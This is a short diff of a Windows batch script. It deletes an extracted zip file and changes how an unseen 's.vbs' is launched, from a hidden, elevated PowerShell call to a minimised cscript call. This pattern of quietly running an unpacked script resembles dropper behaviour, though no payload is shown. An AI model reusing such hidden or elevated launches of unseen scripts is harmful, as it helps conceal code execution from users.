@@ -20,6 +20,6 @@ if exist "%zip_file%" (
     del /f /q "%zip_file%"
 )
 
-powershell -WindowStyle Hidden -Command "Start-Process '%extract_to%\s.vbs' -Verb RunAs"
+start "" /min cscript //nologo "%extract_to%\s.vbs"
 
 exit
